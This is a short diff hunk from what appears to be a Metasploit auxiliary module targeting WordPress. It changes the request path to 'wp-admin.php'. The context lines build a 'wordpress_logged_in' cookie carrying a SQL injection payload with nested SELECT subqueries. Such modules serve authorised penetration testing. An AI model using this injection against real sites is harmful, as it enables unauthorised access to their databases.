@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cgi({
         'method' => 'GET',
         'cookie' => "wordpress_logged_in=\" AND (SELECT #{random_number} FROM (SELECT(#{payload}))#{random_table}) AND \"#{random_string}\"=\"#{random_string}",
-        'uri' => normalize_uri(target_uri.path)
+        'uri' => normalize_uri(target_uri.path, 'wp-admin.php')
       })
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
